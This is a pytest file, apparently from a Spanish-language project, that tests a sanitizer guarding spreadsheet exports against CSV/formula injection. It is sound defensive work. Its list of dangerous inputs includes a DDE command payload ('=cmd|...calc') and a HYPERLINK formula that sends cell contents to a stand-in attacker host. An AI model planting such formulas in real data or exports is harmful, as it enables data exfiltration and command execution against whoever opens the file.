"""
Tests para `core.excel_safety` — guard contra CSV/formula injection
(CVE-2014-3524).

Vector clásico: producto llamado `=cmd|...` o `=HYPERLINK(...)` queda
guardado en BD. Cuando el dueño descarga el reporte y lo abre, Excel
ejecuta la fórmula → exfiltración o ejecución de comando.

Mitigación: prefijar la celda con apóstrofo `'` antes de escribirla.
"""
import pytest

from core.excel_safety import sanitize_cell, sanitize_row


class TestSanitizeCell:
    def test_safe_string_unchanged(self):
        assert sanitize_cell("Cappuccino") == "Cappuccino"

    def test_safe_string_with_equals_in_middle(self):
        # `=` en el medio NO dispara fórmula (Excel solo se interesa por leading char)
        assert sanitize_cell("price=1000") == "price=1000"

    @pytest.mark.parametrize("dangerous", [
        "=SUM(A1:A2)",
        "=cmd|'/c calc'!A1",
        '=HYPERLINK("http://attacker/?d="&A1,"click")',
        "+SUM(A1)",
        "-1+1",
        "@SUM(A1)",
        "\t=evil",
        "\r=evil",
    ])
    def test_dangerous_strings_get_apostrophe_prefix(self, dangerous):
        result = sanitize_cell(dangerous)
        assert result.startswith("'"), f"Esperaba prefijo `'`, obtuvo: {result!r}"
        # El contenido visible se mantiene
        assert result[1:] == dangerous

    def test_idempotent(self):
        """Aplicar sanitize dos veces NO agrega un segundo apóstrofo
        porque el primer `'` ya hace que no empiece con char peligroso."""
        once = sanitize_cell("=evil")
        twice = sanitize_cell(once)
        assert twice == once

    def test_non_string_unchanged(self):
        # Numbers, booleans, dates, decimals, None pasan tal cual
        assert sanitize_cell(123) == 123
        assert sanitize_cell(123.45) == 123.45
        assert sanitize_cell(True) is True
        assert sanitize_cell(None) is None
        assert sanitize_cell([1, 2, 3]) == [1, 2, 3]

    def test_empty_string(self):
        assert sanitize_cell("") == ""

    def test_apostrophe_prefix_already_safe(self):
        # Strings que ya empiezan con `'` son seguros (Excel no los
        # interpreta como fórmula). No los modificamos.
        assert sanitize_cell("'hello") == "'hello"


class TestSanitizeRow:
    def test_mixed_row(self):
        row = ["Cappuccino", 100, "=evil", None, "+1"]
        result = sanitize_row(row)
        assert result == ["Cappuccino", 100, "'=evil", None, "'+1"]

    def test_empty_row(self):
        assert sanitize_row([]) == []
